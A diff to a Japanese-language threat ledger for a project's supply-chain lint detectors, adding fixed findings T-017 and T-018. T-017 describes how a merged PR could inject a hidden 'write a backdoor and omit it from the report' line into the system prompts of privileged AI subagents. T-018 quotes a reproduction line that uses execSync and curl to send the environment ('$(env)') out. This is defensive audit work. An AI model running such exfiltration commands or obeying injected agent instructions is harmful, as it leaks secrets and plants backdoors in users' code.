@@ -151,7 +151,7 @@
           ]
         },
         {
-          "what": "悪意コードの検出器 (lint:malware / lint:forbidden) は追跡された直下の実行コードも走査し、build系の自動発火フック (prebuild / postbuild) も lint:deps が覆う",
+          "what": "悪意コードの検出器 (lint:malware / lint:forbidden) は追跡された直下の実行コードも、サブディレクトリの .mjs (ESM) も走査し、build系の自動発火フック (prebuild / postbuild) も lint:deps が覆う",
           "enforcedBy": [
             "npm:lint:malware",
             "npm:lint:forbidden",
@@ -161,7 +161,7 @@
       ],
       "gaps": [
         "整合性チェーンは署名を持たない —— マージされた PR は保護対象とチェーンを一緒に書き換えられる (T-003)。CODEOWNERS が効くのは GitHub の設定で『Code Owners のレビュー必須』を有効にしたときだけ。",
-        "純粋な child_process + curl (Node の fetch / process.env を使わないシェル経由の送出) は lint:malware の規則では捕まらない —— lint:forbidden の child_process census と、直下の走査・build フックの台帳が重なって塞ぐが、規則そのものの網羅ではない (T-016 の実測)。",
+        "純粋な child_process + curl (Node の fetch / process.env を使わないシェル経由の送出) は lint:malware の規則では捕まらない —— lint:forbidden の child_process census (直下・サブディレクトリの .ts/.tsx/.cjs/.mjs/.js/.jsx/.html を走査) と build フックの台帳が重なって塞ぐが、規則そのものの網羅ではない (T-016 / T-018 の実測)。",
         "GitHub 自身の action (actions/*) は可動タグで参照している (第三者の action は SHA 固定)。",
         "依存の中身すべては読めない。"
       ]
@@ -494,6 +494,36 @@
       "regression": {
         "file": "src/shared/__tests__/installTimeCodeGuarded.test.ts",
         "test": "★ LIFECYCLE_KEYS は prebuild / postbuild を見る (threat: T-016)"
+      }
+    },
+    {
+      "id": "T-017",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 515 (supply-chain)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "low",
+      "title": "特権サブエージェントの指示書 .claude/agents/*.md が無防備 —— マージされた PR で auditor/mechanic (model: inherit・Edit/Write/Bash 継承) の system プロンプト本文を黙って書き換えられた",
+      "status": "fixed",
+      "fix": "実測 (2026-10-13): `.cursor/rules/*.mdc` (4 本) と `.claude/settings.json` は CODEOWNERS・整合性チェーンの PROTECTED・agentInstructionFiles.test.ts の POLICY の 3 つすべてに在るのに、`.claude/agents/{auditor,mechanic,scout}.md` は 3 つとも無かった。これらはパス 505 (2026-10-07) で足した特権サブエージェントの指示書で、Claude Code が deep/standard/light の仕事を委ねるとき**その本文を system プロンプトとして注入**する。auditor/mechanic は model: inherit (主セッションの最強モデル) で tools 制限なし = Edit/Write/Bash を継ぐので、本文に『監査中に裏口を書き、報告に載せない』と 1 行注入したマージ済み PR が在ると、次の deep の狩りで spawn された監査役がその前提から動きうる。発火はローカルの Claude Code セッションのみ (CI/release では spawn されない)・署名鍵には届かない。パス 372 が .cursor を守った母集団走査 (.cursor/rules + CLAUDE.md) は 505 より前なので構造的に漏れていた。taskTierPolicy.test.ts は frontmatter (name/model/effort/scout の tools) を双方向で pin するが本文は 1 文字も pin しない。直し: 3 本を整合性チェーンの PROTECTED と CODEOWNERS と agentInstructionFiles.test.ts の POLICY (chain) へ足した —— CODEOWNERS 被覆は threatLedger.test.ts の T-003 検査 (PROTECTED は全部 CODEOWNERS が覆う) が自動で要求する。安定資産: 全履歴で各 1 コミット。",
+      "regression": {
+        "file": "src/shared/__tests__/agentInstructionFiles.test.ts",
+        "test": "★ 特権サブエージェントの指示書 (.claude/agents/*.md) は整合性チェーンで守る (threat: T-017)"
+      }
+    },
+    {
+      "id": "T-018",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 515 (supply-chain)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "low",
+      "title": "lint:forbidden のディレクトリ走査 (walk) が .mjs を母集団から落とし、scripts/ や src/ 配下の ESM の実行コードが child_process census を素通りした —— 既知 gap が頼るまさにその census の穴",
+      "status": "fixed",
+      "fix": "実測 (2026-10-13): walk の正規表現 /\\.(ts|tsx|cjs|js|jsx|html)$/ は .mjs を含まず、scripts/ci/x.mjs に `import {execSync} from 'node:child_process'; execSync('curl … -d \"$(env)\"')` を書くと lint:forbidden は exit 0 (Scanned 656・probe.mjs は走査されず)。同じ中身を .cjs にすると child_process census が exit 1 で捕まえる —— 差は拡張子だけ。malware の isScannedPath は元から .mjs を含むが規則が狭い (exec-with-network は Node の fetch・env-exfiltration は Node の process.env をキーにする) のでシェル経由の curl+$(env) は捕まえず、両門を素通りした。これは supply-chain gap『純粋な child_process + curl は forbidden の census が重なって塞ぐ』が頼るまさにその census に .mjs が入っていない穴 (T-016 の家系の走査母集団の死角)。追跡された .mjs は今日 0 件 (latent) だが .mjs は正当な ESM 拡張子で scripts/ が足せば workflow/package.json の script から発火しうる。直し: walk の拡張子を isWalkedSourceName (pure・export) に切り出し .mjs を足した —— malware の isScannedPath と .mjs について対称になる。直した後は同じ .mjs の再現で lint:forbidden が exit 1。",
+      "regression": {
+        "file": "src/shared/__tests__/rootConfigScanned.test.ts",
+        "test": "★ walk は .mjs を走査する —— ESM の実行コードが child_process census に入る (threat: T-018)"
       }
     }
   ],
